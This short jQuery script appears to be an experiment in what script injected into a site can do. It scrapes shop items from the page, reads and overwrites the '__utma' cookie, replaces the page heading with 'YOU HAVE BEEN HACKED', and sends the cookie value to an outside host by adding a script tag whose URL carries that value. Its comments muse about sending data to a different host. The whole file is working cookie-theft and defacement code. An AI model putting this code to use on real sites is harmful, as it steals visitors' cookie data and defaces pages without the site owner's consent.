$(function() {
	// Pull info from page
	$('.shop-item').each(function(index) {
		console.log(index + ": " + $(this).text());
	});
	
	// Read a cookie for THIS SITE
	console.log($.cookie('__utma'));
	
	// Update a cookie for THIS SITE
	$.cookie('__utma', 'fred', {expires:7});
	var c = $.cookie('__utma');
	console.log(c);	
	
	// Update the page heading
	$('h1').html('YOU HAVE BEEN HACKED');
	
	// Can you send this data to a different host? Probably!
	$(document.createElement('script'))
		.attr('src', 'http://www.slepeweb.com/sandy/web/generic?v=' + c)
		.appendTo('head');
		
	// But I can't see there being any data worth taking on the jaguar site ...
});